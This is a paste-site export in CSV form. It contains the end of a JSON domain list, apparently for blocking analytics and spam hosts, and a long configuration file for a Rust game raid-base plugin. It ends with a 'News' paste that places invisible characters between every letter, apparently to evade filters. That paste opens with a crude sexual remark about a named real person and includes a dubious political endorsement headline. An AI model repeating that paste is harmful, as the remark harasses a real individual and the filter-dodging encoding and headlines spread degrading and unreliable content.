        ""xg.huataisangao.cn"",
        ""z2.cnzz.com"",
        ""s96.cnzz.com"",
        ""q11.cnzz.com"",
        ""thy.dacedsfa.cn"",
        ""xg.whsbpw.cn"",
        ""s19.cnzz.com"",
        ""z8.cnzz.com"",
        ""s4.cnzz.com"",
        ""f5w.as12df.top"",
        ""ae01.alicdn.com"",
        ""www.92424.cn"",
        ""k.wudejia.com"",
        ""vivovip.mmszxc.top"",
        ""qiu.xixiqiu.com"",
        ""cdnjs.hnfenxun.com"",
        ""cms.qdwght.com""
    ]
}"
ZZmHADkz,RaidableBasesConfig,nivex,JSON,Sunday 10th of March 2024 10:49:54 PM CDT,"{
  ""Settings"": {
    ""Show Direction To Coordinates"": false,
    ""Experimental [* = everything]"": {
      ""Apply Custom Auto Height To"": [],
      ""Bunker Bases Or Profiles"": [],
      ""Multi Foundation Bases Or Profiles"": []
    },
    ""Raid Management"": {
      ""Divide Locker Loot When Enabled"": true,
      ""Ignore List For Turn Lights On"": [
        ""laserlight"",
        ""weaponrack"",
        ""lightswitch"",
        ""soundlight"",
        ""xmas""
      ],
      ""Grids To Block Spawns At"": [],
      ""Block Spawns At Positions"": [
        {
          ""position"": ""(0.00, 0.00, 0.00)"",
          ""radius"": 200.0
        }
      ],
      ""Additional Map Prefabs To Block Spawns At"": {
        ""test_prefab"": 150.0,
        ""test_prefab_2"": 125.25
      },
      ""Eject Mounts"": {
        ""All Controlled Mounts"": false,
        ""All Other Mounts"": false,
        ""Attack Helicopters"": false,
        ""Boats"": false,
        ""Campers"": true,
        ""Cars (Basic)"": false,
        ""Cars (Modular)"": false,
        ""Chinook"": false,
        ""Flying Carpet"": false,
        ""Horses"": false,
        ""HotAirBalloon"": true,
        ""Jetpacks"": true,
        ""MiniCopters"": false,
        ""Parachutes"": false,
        ""Pianos"": true,
        ""Scrap Transport Helicopters"": false,
        ""Snowmobiles"": false,
        ""Tugboats"": false
      },
      ""Max Amount Of Players Allowed To Enter (0 = infinite, -1 = none)"": {
        ""Maintained Events"": 0,
        ""Manual Events"": 0,
        ""Scheduled Events"": 0,
        ""Bypass For PVP Bases"": false
      },
      ""Additional Containers To Include As Boxes"": [
        ""locker""
      ],
      ""Difficulty Colors (Border)"": {
        ""Normal"": ""000000""
      },
      ""Difficulty Colors (Inner)"": {
        ""Normal"": ""00FF00""
      },
      ""Entities Allowed To Drop Loot"": {
        ""Auto Turrets"": false,
        ""Flame Turret"": false,
        ""Fog Machine"": false,
        ""Gun Trap"": false,
        ""SAM Site"": false
      },
      ""Additional Blocked Colliders"": [
        ""cube""
      ],
      ""Allow Teleport"": false,
      ""Allow Cupboard Loot To Drop"": true,
      ""Allow Players To Build"": true,
      ""Allow Players To Use Ladders"": true,
      ""Allow Players To Upgrade Event Buildings"": false,
      ""Allow Player Bags To Be Lootable At PVP Bases"": true,
      ""Allow Player Bags To Be Lootable At PVE Bases"": true,
      ""Allow Players To Loot Traps"": false,
      ""Allow Npcs To Target Other Npcs"": false,
      ""Allow Raid Bases Inland"": true,
      ""Allow Raid Bases On Beaches"": true,
      ""Allow Raid Bases On Ice Sheets"": false,
      ""Allow Raid Bases On Roads"": true,
      ""Allow Raid Bases On Rivers"": true,
      ""Allow Raid Bases On Railroads"": false,
      ""Allow Raid Bases On Building Topology"": true,
      ""Allow Raid Bases On Monument Topology"": false,
      ""Amount Of Spawn Position Checks Per Frame (ADVANCED USERS ONLY)"": 25,
      ""Allow Vending Machines To Broadcast"": false,
      ""Backpacks Can Be Opened At PVE Bases"": true,
      ""Backpacks Can Be Opened At PVP Bases"": true,
      ""Backpacks Drop At PVE Bases"": false,
      ""Backpacks Drop At PVP Bases"": false,
      ""Block Npc Kits Plugin"": false,
      ""Block Helicopter Damage To Bases"": false,
      ""Block Mounted Damage To Bases And Players"": false,
      ""Block Mini Collision Damage"": false,
      ""Block DoubleJump Plugin"": true,
      ""Block RestoreUponDeath Plugin For PVP Bases"": false,
      ""Block RestoreUponDeath Plugin For PVE Bases"": false,
      ""Block LifeSupport Plugin"": true,
      ""Block Rewards During Server Restart"": false,
      ""Bypass Lock Treasure To First Attacker For PVE Bases"": false,
      ""Bypass Lock Treasure To First Attacker For PVP Bases"": false,
      ""Despawn Spawned Mounts"": true,
      ""Do Not Destroy Player Built Deployables"": true,
      ""Do Not Destroy Player Built Structures"": true,
      ""Distance To Spawn From Center Of Map"": 200.0,
      ""Divide Rewards Among All Raiders"": true,
      ""Draw Corpse Time (Seconds)"": 300.0,
      ""Destroy Boxes Clipped Too Far Into Terrain"": true,
      ""Destroy Turrets Clipped Too Far Into Terrain"": true,
      ""Eject Sleepers Before Spawning Base"": true,
      ""Eject Scavengers When Raid Is Completed"": true,
      ""Extra Distance To Spawn From Monuments"": 25.0,
      ""Move Cookables Into Ovens"": true,
      ""Move Food Into BBQ Or Fridge"": true,
      ""Blacklist For BBQ And Fridge"": [
        ""syrup"",
        ""pancakes""
      ],
      ""Move Resources Into Tool Cupboard"": true,
      ""Move Items Into Lockers"": true,
      ""Lock Treasure To First Attacker"": true,
      ""Lock Treasure Max Inactive Time (Minutes)"": 20.0,
      ""Lock Players To Raid Base After Entering Zone"": false,
      ""Only Award First Attacker and Allies"": false,
      ""Only Award Owner Of Raid"": false,
      ""Minutes Until Despawn After Looting (min: 1)"": 15,
      ""Minutes Until Despawn After Looting Resets When Damaged"": false,
      ""Minutes Until Despawn After Inactive (0 = disabled)"": 45,
      ""Minutes Until Despawn After Inactive Resets When Damaged"": true,
      ""Mounts Can Take Damage From Players"": false,
      ""Player Cupboard Detection Radius"": 125.0,
      ""Players With PVP Delay Can Damage Anything Inside Zone"": false,
      ""Players With PVP Delay Can Damage Other Players With PVP Delay Anywhere"": false,
      ""PVP Delay Between Zone Hopping"": 10.0,
      ""Prevent Fire From Spreading"": true,
      ""Prevent Players From Hogging Raids"": true,
      ""Block Clans From Owning More Than One Raid"": false,
      ""Block Friends From Owning More Than One Raid"": false,
      ""Block Teams From Owning More Than One Raid"": false,
      ""Prevent Fall Damage When Base Despawns"": false,
      ""Require Cupboard To Be Looted Before Despawning"": false,
      ""Destroying The Cupboard Completes The Raid"": false,
      ""Require All Bases To Spawn Before Respawning An Existing Base"": true,
      ""Turn Lights On At Night"": true,
      ""Turn Lights On Indefinitely"": false,
      ""Traps And Turrets Ignore Users Using NOCLIP"": false,
      ""Use Random Codes On Code Locks"": true,
      ""Wait To Start Despawn Timer When Base Takes Damage From Player"": false,
      ""Maximum Water Depth For All Npcs"": 3.0
    },
    ""Map Markers"": {
      ""Marker Name"": ""Raidable Base Event"",
      ""Radius"": 0.25,
      ""Radius (Map Size 3600 Or Less)"": 0.25,
      ""Use Vending Map Marker"": true,
      ""Show Owners Name on Map Marker"": true,
      ""Use Explosion Map Marker"": false,
      ""Create Markers For Maintained Events"": true,
      ""Create Markers For Scheduled Events"": true,
      ""Create Markers For Manual Events"": true
    },
    ""Maintained Events"": {
      ""Always Maintain Max Events"": true,
      ""Max Maintained Events"": 3,
      ""Chance To Randomly Spawn PVP Bases (0 = Ignore Setting)"": 0.0,
      ""Include PVE Bases"": true,
      ""Include PVP Bases"": true,
      ""Minimum Required Players Online"": 0,
      ""Maximum Limit Of Players Online"": 300,
      ""Time To Wait Between Spawns"": 15.0,
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": true,
      ""Ignore Safe Checks"": false,
      ""Ignore Safe Checks In X Radius Only"": 0.0,
      ""Ignore Player Entities At Custom Spawn Locations"": false,
      ""Spawn Bases X Distance Apart"": 100.0,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Manual Events"": {
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": false,
      ""Max Manual Events"": 1,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Scheduled Events"": {
      ""Enabled"": false,
      ""Every Min Seconds"": 3600.0,
      ""Every Max Seconds"": 7200.0,
      ""Max Scheduled Events"": 1,
      ""Max To Spawn At Once (0 = Use Max Scheduled Events Amount)"": 0,
      ""Chance To Randomly Spawn PVP Bases (0 = Ignore Setting)"": 0.0,
      ""Include PVE Bases"": true,
      ""Include PVP Bases"": true,
      ""Minimum Required Players Online"": 1,
      ""Maximum Limit Of Players Online"": 300,
      ""Time To Wait Between Spawns"": 15.0,
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": false,
      ""Ignore Safe Checks"": false,
      ""Ignore Safe Checks In X Radius Only"": 0.0,
      ""Ignore Player Entities At Custom Spawn Locations"": false,
      ""Spawn Bases X Distance Apart"": 100.0,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Allowed Zone Manager Zones"": [
      ""pvp"",
      ""99999999""
    ],
    ""Use Grid Locations In Allowed Zone Manager Zones Only"": false,
    ""Extended Distance To Spawn Away From Zone Manager Zones"": 25.0,
    ""Blacklisted Commands"": [],
    ""Automatically Teleport Admins To Their Map Marker Positions"": true,
    ""Automatically Destroy Markers That Admins Teleport To"": false,
    ""Block Archery Plugin At Events"": false,
    ""Block Wizardry Plugin At Events"": false,
    ""Chat Steam64ID"": 0,
    ""Expansion Mode (Dangerous Treasures)"": false,
    ""Remove Admins From Raiders List"": false,
    ""Show X Z Coordinates"": false,
    ""Event Command"": ""rbe"",
    ""Hunter Command"": ""rb"",
    ""Server Console Command"": ""rbevent""
  },
  ""Event Messages"": {
    ""Ineligible For Rewards"": {
      ""Flying"": false,
      ""Vanished"": false,
      ""Inactive"": true,
      ""Not An Ally"": true,
      ""Not The Owner"": true,
      ""Not A Participant"": true,
      ""Remove Admins From Raiders List"": false
    },
    ""Announce Raid Unlocked"": false,
    ""Announce Thief Message"": true,
    ""Announce PVE/PVP Enter/Exit Messages"": true,
    ""Show Destroy Warning"": true,
    ""Show Opened Message For PVE Bases"": true,
    ""Show Opened Message For PVP Bases"": true,
    ""Show Prefix"": true,
    ""Notify Plugin - Type (-1 = disabled)"": -1,
    ""Notification Interval"": 1.0,
    ""Send Messages To Player"": true,
    ""Save Thieves To Log File"": false
  },
  ""GUIAnnouncements"": {
    ""Enabled"": false,
    ""Banner Tint Color"": ""Grey"",
    ""Maximum Distance"": 300.0,
    ""Text Color"": ""White""
  },
  ""Ranked Ladder"": {
    ""Award Top X Players On Wipe"": 3,
    ""Enabled"": true,
    ""Show Top X Ladder"": 10
  },
  ""Skins"": {
    ""Boxes"": {
      ""Include Workshop Skins"": true,
      ""Preset Skin"": 0,
      ""Use Random Skin"": true
    },
    ""Loot Items"": {
      ""Include Workshop Skins"": true,
      ""Use Random Skin"": true,
      ""Use Imported Workshop Skins File"": false
    },
    ""Deployables"": {
      ""Partial Names"": [
        ""door"",
        ""barricade"",
        ""chair"",
        ""fridge"",
        ""furnace"",
        ""locker"",
        ""reactivetarget"",
        ""rug"",
        ""sleepingbag"",
        ""table"",
        ""vendingmachine"",
        ""waterpurifier"",
        ""skullspikes"",
        ""skulltrophy"",
        ""summer_dlc"",
        ""sled""
      ],
      ""Preset Door Skins"": [],
      ""Include Workshop Skins"": true,
      ""Use Random Skin"": true,
      ""Skin Everything"": true
    },
    ""Randomize Npc Item Skins"": true,
    ""Use Identical Skins For All Npcs"": true,
    ""Ignore If Skinned Already"": true
  },
  ""Treasure"": {
    ""Resources Not Moved To Cupboards"": [
      ""skull.human"",
      ""battery.small"",
      ""bone.fragments"",
      ""can.beans.empty"",
      ""can.tuna.empty"",
      ""water.salt"",
      ""water"",
      ""skull.wolf""
    ],
    ""Use Day Of Week Loot"": false,
    ""Do Not Duplicate Base Loot"": false,
    ""Do Not Duplicate Difficulty Loot"": false,
    ""Do Not Duplicate Default Loot"": false,
    ""Use Stack Size Limit For Spawning Items"": false
  },
  ""UI"": {
    ""Advanced Alerts UI"": {
      ""Enabled"": true,
      ""Anchor Min"": ""0.35 0.85"",
      ""Anchor Max"": ""0.65 0.95"",
      ""Time Shown"": 5.0
    },
    ""Delay"": {
      ""Enabled"": false,
      ""Anchor Min"": ""0.472 0.172"",
      ""Anchor Max"": ""0.55 0.311"",
      ""Panel Alpha"": 0.98,
      ""Text Color"": ""#FF0000"",
      ""Panel Color"": ""#000000""
    },
    ""Details"": {
      ""Enabled"": true,
      ""Anchor Min"": ""0.748 0.228"",
      ""Anchor Max"": ""0.986 0.248"",
      ""Panel Alpha"": 0.98,
      ""Details Font Size"": 10,
      ""Panel Color"": ""#000000"",
      ""Label Color"": ""#EAEAEA"",
      ""Negative Color"": ""#FF0000"",
      ""Positive Color"": ""#008000""
    },
    ""Enabled"": true,
    ""Status Anchor Min"": ""0.748 0.249"",
    ""Status Anchor Max"": ""0.986 0.279"",
    ""Status Font Size"": 12,
    ""Panel Alpha"": 0.98,
    ""Panel Color"": ""#000000"",
    ""PVP Color"": ""#FF0000"",
    ""PVE Color"": ""#008000"",
    ""Show Loot Left"": true,
    ""Show Time Left"": true
  },
  ""Weapons"": {
    ""Furnace Starting Fuel"": 1000,
    ""Infinite Ammo"": {
      ""AutoTurret"": true,
      ""FlameTurret"": true,
      ""FogMachine"": true,
      ""GunTrap"": true,
      ""SamSite"": true
    },
    ""Ammo"": {
      ""AutoTurret"": 256,
      ""FlameTurret"": 256,
      ""FogMachine"": 5,
      ""GunTrap"": 128,
      ""SamSite"": 24
    },
    ""Tesla Coil"": {
      ""Requires A Power Source"": true,
      ""Max Discharge Self Damage Seconds (0 = None, 120 = Rust default)"": 0.0,
      ""Max Damage Output"": 35.0,
      ""Health"": 250.0
    },
    ""Fog Machine Allows Motion Toggle"": true,
    ""Fog Machine Requires A Power Source"": true,
    ""SamSite Repairs Every X Minutes (0.0 = disabled)"": 5.0,
    ""SamSite Range (350.0 = Rust default)"": 75.0,
    ""SamSite Requires Power Source"": false,
    ""Spooky Speakers Requires Power Source"": false,
    ""Test Generator Power"": 100.0
  }
}"
fteegiHQ,Normal,nivex,JSON,Sunday 10th of March 2024 10:43:17 PM CDT,"{
  ""Rearm Bear Traps When Damaged"": false,
  ""Bear Traps Are Immune To Timed Explosives"": false,
  ""Advanced Protection Radius"": {
    ""Maintained Events"": 50.0,
    ""Manual Events"": 50.0,
    ""Scheduled Events"": 50.0,
    ""Obstruction Distance Check"": -1.0
  },
  ""Advanced Setup Settings"": {
    ""Amount Of Entities To Spawn Per Batch"": 1,
    ""Amount Of Entities To Despawn Per Batch"": 10,
    ""Height Adjustment Applied To This Paste"": 0.0,
    ""Force All Bases To Spawn At Height Level (0 = Water)"": -1.0,
    ""Foundations Immune To Damage When Forced Height Is Applied"": false
  },
  ""Elevators"": {
    ""Enabled"": true,
    ""Anchor Min"": ""0.406 0.915"",
    ""Anchor Max"": ""0.59 0.949"",
    ""Panel Alpha"": 0.0,
    ""Required Access Level"": 0,
    ""Panel Color"": ""#000000"",
    ""Required Access Level Grants Permanent Use"": false,
    ""Required Keycard Skin ID"": 2690554489,
    ""Requires Building Permission"": false,
    ""Button Health"": 1000.0,
    ""Elevator Health"": 600.0
  },
  ""Entities Not Allowed To Be Picked Up"": [
    ""generator.small"",
    ""generator.static"",
    ""autoturret_deployed""
  ],
  ""Additional Bases For This Difficulty"": {
    ""1x1med"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ],
    ""2x1med"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ],
    ""3x1HARDbase"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ]
  },
  ""Paste Options"": [],
  ""Arena Walls"": {
    ""Enabled"": false,
    ""Stacks"": 1,
    ""Ignore Stack Limit When Clipping Terrain"": true,
    ""Use Stone Walls"": false,
    ""Use Iced Walls"": false,
    ""Use Least Amount Of Walls"": true,
    ""Use UFO Walls"": false,
    ""Radius"": 25.0
  },
  ""NPC Levels"": {
    ""Level 2 - Final Death"": false
  },
  ""NPCs"": {
    ""Weapon Accuracy (0 - 100)"": {
      ""AK47"": 15.0,
      ""AK47 ICE"": 15.0,
      ""Bolt Rifle"": 15.0,
      ""Compound Bow"": 15.0,
      ""Crossbow"": 15.0,
      ""Double Barrel Shotgun"": 15.0,
      ""Eoka"": 15.0,
      ""Glock"": 15.0,
      ""HMLMG"": 15.0,
      ""L96"": 15.0,
      ""LR300"": 15.0,
      ""M249"": 15.0,
      ""M39"": 15.0,
      ""M92"": 15.0,
      ""MP5"": 15.0,
      ""Nailgun"": 15.0,
      ""Pump Shotgun"": 15.0,
      ""Python"": 15.0,
      ""Revolver"": 15.0,
      ""Semi Auto Pistol"": 15.0,
      ""Semi Auto Rifle"": 15.0,
      ""Spas12"": 15.0,
      ""Speargun"": 15.0,
      ""SMG"": 15.0,
      ""Snowball Gun"": 15.0,
      ""Thompson"": 15.0,
      ""Waterpipe Shotgun"": 15.0
    },
    ""Damage Multipliers"": {
      ""Gun Damage Multiplier"": 1.0,
      ""Melee Damage Multiplier"": 1.0
    },
    ""Murderer (Items)"": {
      ""Helm"": [
        ""metal.facemask""
      ],
      ""Torso"": [
        ""metal.plate.torso""
      ],
      ""Pants"": [
        ""pants""
      ],
      ""Gloves"": [
        ""tactical.gloves""
      ],
      ""Boots"": [
        ""boots.frog""
      ],
      ""Shirt"": [
        ""tshirt""
      ],
      ""Kilts"": [],
      ""Weapon"": [
        ""machete""
      ]
    },
    ""Scientist (Items)"": {
      ""Helm"": [],
      ""Torso"": [
        ""hazmatsuit_scientist_peacekeeper""
      ],
      ""Pants"": [],
      ""Gloves"": [],
      ""Boots"": [],
      ""Shirt"": [],
      ""Kilts"": [],
      ""Weapon"": [
        ""rifle.ak""
      ]
    },
    ""Murderer Kits"": [
      ""murderer_kit_1"",
      ""murderer_kit_2""
    ],
    ""Scientist Kits"": [
      ""scientist_kit_1"",
      ""scientist_kit_2""
    ],
    ""Random Names"": [],
    ""Spawn Alternate Default Scientist Loot"": {
      ""Prefab ID List"": [
        ""cargo"",
        ""turret_any"",
        ""ch47_gunner"",
        ""excavator"",
        ""full_any"",
        ""heavy"",
        ""junkpile_pistol"",
        ""oilrig"",
        ""patrol"",
        ""peacekeeper"",
        ""roam"",
        ""roamtethered""
      ],
      ""Enabled"": false,
      ""Disable All Prefab Loot Spawns"": false
    },
    ""Enabled"": true,
    ""Amount Of Murderers To Spawn"": 5,
    ""Minimum Amount Of Murderers To Spawn"": 3,
    ""Spawn Random Amount Of Murderers"": false,
    ""Amount Of Scientists To Spawn"": 5,
    ""Minimum Amount Of Scientists To Spawn"": 3,
    ""Spawn Random Amount Of Scientists"": false,
    ""Allow Npcs To Leave Dome When Attacking"": true,
    ""Allow Npcs To Shoot Players Outside Of The Dome"": true,
    ""Aggression Range"": 70.0,
    ""Block Damage Outside To Npcs When Not Allowed To Leave Dome"": true,
    ""Block Damage Outside Of The Dome To Npcs Inside"": false,
    ""Despawn Inventory On Death"": true,
    ""Health For Murderers (100 min, 5000 max)"": 150.0,
    ""Health For Scientists (100 min, 5000 max)"": 150.0,
    ""Kill Underwater Npcs"": true,
    ""Player Traps And Turrets Ignore Npcs"": false,
    ""Event Traps And Turrets Ignore Npcs"": true,
    ""Use Dangerous Treasures NPCs"": false
  },
  ""Rewards"": {
    ""Economics Money"": 0.0,
    ""ServerRewards Points"": 0,
    ""SkillTree XP"": 0.0
  },
  ""Change Building Material Tier To"": {
    ""Wooden"": false,
    ""Stone"": false,
    ""Metal"": false,
    ""HQM"": false
  },
  ""Change Door Type To"": {
    ""Wooden"": false,
    ""Metal"": false,
    ""HQM"": false,
    ""Include Garage Doors"": false
  },
  ""Auto Turrets"": {
    ""Aim Cone"": 5.0,
    ""Wait To Power On Until Event Starts"": false,
    ""Minimum Damage Modifier"": 1.0,
    ""Maximum Damage Modifier"": 1.0,
    ""Start Health"": 1000.0,
    ""Sight Range"": 30.0,
    ""Double Sight Range When Shot"": false,
    ""Set Hostile (False = Do Not Set Any Mode)"": true,
    ""Requires Power Source"": false,
    ""Remove Equipped Weapon"": false,
    ""Random Weapons To Equip When Unequipped"": [
      ""rifle.ak""
    ]
  },
  ""Player Building Restrictions"": {
    ""Wooden"": false,
    ""Stone"": false,
    ""Metal"": false,
    ""HQM"": false
  },
  ""Water Settings"": {
    ""Allow Bases To Float Above Water"": false,
    ""Prevent Bases From Floating Above Water By Also Checking Surrounding Area"": false,
    ""Maximum Water Depth Level Used For Float Above Water Option"": 1.0
  },
  ""Profile Enabled"": true,
  ""Maximum Land Level"": 2.5,
  ""Allow Players To Use MLRS"": true,
  ""Allow Third-Party Npc Explosive Damage To Bases"": false,
  ""Add Code Lock To Unlocked Or KeyLocked Doors"": true,
  ""Add Key Lock To Unlocked Or CodeLocked Doors"": false,
  ""Add Code Lock To Tool Cupboards"": false,
  ""Add Code Lock To Boxes"": false,
  ""Add Code Lock To Lockers"": true,
  ""Close Open Doors With No Door Controller Installed"": true,
  ""Allow Duplicate Items"": false,
  ""Allow Players To Pickup Deployables"": false,
  ""Allow Players To Deploy A Cupboard"": true,
  ""Allow Players To Deploy Barricades"": true,
  ""Allow PVP"": true,
  ""Allow Friendly Fire (Teams)"": false,
  ""Minimum Amount Of Items To Spawn (0 = Use Max Value)"": 15,
  ""Amount Of Items To Spawn"": 40,
  ""Flame Turret Health"": 300.0,
  ""Block Plugins Which Prevent Item Durability Loss"": false,
  ""Block Damage Outside Of The Dome To Players Inside"": false,
  ""Block Damage Outside Of The Dome To Bases Inside"": false,
  ""Block Damage Inside From Npcs To Players Outside"": false,
  ""Building Blocks Are Immune To Damage"": false,
  ""Building Blocks Are Immune To Damage (Twig Only)"": false,
  ""Boxes Are Invulnerable"": false,
  ""Boxes Are Invulnerable Until Cupboard Is Destroyed"": false,
  ""Spawn Silently (No Notifcation, No Dome, No Map Marker)"": false,
  ""Despawn Dropped Loot Bags From Raid Boxes When Base Despawns"": false,
  ""Divide Loot Into All Containers"": true,
  ""Drop Tool Cupboard Loot After Raid Is Completed"": false,
  ""Drop Container Loot X Seconds After It Is Looted"": 0.0,
  ""Drop Container Loot Applies Only To Boxes And Cupboards"": true,
  ""Create Dome Around Event Using Spheres (0 = disabled, recommended = 5)"": 5,
  ""Empty All Containers Before Spawning Loot"": false,
  ""Empty All Containers (Exclusions)"": [
    ""xmas_tree.deployed"",
    ""xmas_tree_a.deployed""
  ],
  ""Eject Corpses From Enemy Raids (Advanced Users Only)"": true,
  ""Eject Corpses From PVE Instantly (Advanced Users Only)"": false,
  ""Eject Enemies From Locked PVE Raids"": true,
  ""Eject Enemies From Locked PVP Raids"": false,
  ""Explosion Damage Modifier (0-999)"": 100.0,
  ""Force All Boxes To Have Same Skin"": true,
  ""Ignore Containers That Spawn With Loot Already"": false,
  ""Loot Amount Multiplier"": 1.0,
  ""Maximum Respawn Npc X Seconds After Death"": 0.0,
  ""Minimum Respawn Npc X Seconds After Death"": 0.0,
  ""No Item Input For Boxes And TC"": true,
  ""Penalize Players On Death In PVE (ZLevels)"": true,
  ""Penalize Players On Death In PVP (ZLevels)"": true,
  ""Require Cupboard Access To Loot"": false,
  ""Require Cupboard Access To Place Ladders"": false,
  ""Skip Treasure Loot And Use Loot In Base Only"": false,
  ""Use Buoyant Boxex For Dropped Privilege Loot"": false,
  ""Use Buoyant Boxex For Dropped Box Loot"": false,
  ""Remove Locks When Event Is Completed"": false,
  ""Always Spawn Base Loot Table"": false
}"
Ydgv83Cc,News March10 24,Newscaster_Ned,Email,Sunday 10th of March 2024 10:43:07 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎.‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎j‎e‎r‎k‎i‎n‎g‎ ‎o‎f‎f‎ ‎t‎o‎ ‎p‎i‎c‎t‎u‎r‎e‎s‎ ‎o‎f‎ ‎S‎h‎e‎r‎r‎o‎d‎ ‎D‎e‎G‎r‎i‎p‎p‎o‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎C‎e‎l‎e‎b‎s‎ ‎G‎u‎f‎f‎a‎w‎ ‎a‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎R‎o‎a‎s‎t‎s‎ ‎M‎A‎G‎A‎
T‎r‎u‎m‎p‎ ‎B‎a‎s‎h‎e‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎D‎u‎r‎i‎n‎g‎ ‎O‎s‎c‎a‎r‎s‎:‎ ‎'‎E‎v‎e‎r‎ ‎B‎e‎e‎n‎ ‎a‎ ‎W‎o‎r‎s‎e‎ ‎H‎o‎s‎t‎'‎
O‎s‎c‎a‎r‎s‎ ‎G‎o‎e‎s‎ ‎B‎i‎g‎ ‎o‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎:‎ ‎'‎2‎0‎ ‎D‎a‎y‎s‎ ‎i‎n‎ ‎M‎a‎r‎i‎u‎p‎o‎l‎'‎ ‎W‎i‎n‎s‎ ‎B‎e‎s‎t‎ ‎D‎o‎c‎
W‎i‎s‎c‎o‎n‎s‎i‎n‎ ‎B‎a‎r‎b‎e‎r‎ ‎T‎i‎p‎p‎e‎d‎ ‎$‎1‎,‎0‎0‎0‎ ‎b‎y‎ ‎P‎r‎e‎a‎c‎h‎e‎r‎
W‎A‎T‎C‎H‎:‎ ‎S‎t‎.‎ ‎L‎o‎u‎i‎s‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎s‎ ‎P‎r‎a‎i‎s‎e‎ ‎T‎e‎e‎n‎'‎s‎ ‎P‎o‎p‎u‎l‎a‎r‎ ‎B‎B‎Q‎ ‎S‎t‎a‎n‎d‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
T‎r‎u‎m‎p‎ ‎T‎o‎r‎c‎h‎e‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎D‎u‎r‎i‎n‎g‎ ‎O‎s‎c‎a‎r‎s‎

‘‎H‎a‎s‎ ‎T‎h‎e‎r‎e‎ ‎E‎v‎e‎r‎ ‎B‎e‎e‎n‎ ‎a‎ ‎W‎o‎r‎s‎e‎ ‎H‎o‎s‎t‎’‎
t‎r‎u‎m‎p‎ ‎k‎i‎m‎m‎e‎l‎
F‎o‎r‎m‎e‎r‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎l‎a‎s‎h‎e‎d‎ ‎o‎u‎t‎ ‎a‎t‎ ‎O‎s‎c‎a‎r‎s‎ ‎h‎o‎s‎t‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎e‎r‎e‎m‎o‎n‎y‎,‎ ‎c‎a‎l‎l‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎ ‎“‎w‎a‎s‎h‎e‎d‎ ‎u‎p‎”‎ ‎t‎a‎l‎e‎n‎t‎.‎

M‎i‎t‎t‎ ‎R‎o‎m‎n‎e‎y‎ ‎I‎s‎s‎u‎e‎s‎ ‎C‎o‎m‎p‎l‎e‎t‎e‎ ‎a‎n‎d‎ ‎T‎o‎t‎a‎l‎ ‎E‎n‎d‎o‎r‎s‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎a‎s‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎P‎i‎c‎k‎
M‎i‎t‎t‎ ‎R‎o‎m‎n‎e‎y‎ ‎I‎s‎s‎u‎e‎s‎ ‎C‎o‎m‎p‎l‎e‎t‎e‎ ‎a‎n‎d‎ ‎T‎o‎t‎a‎l‎ ‎E‎n‎d‎o‎r‎s‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎a‎s‎ ‎V‎P‎ ‎P‎i‎c‎k‎
2‎,‎0‎5‎8‎
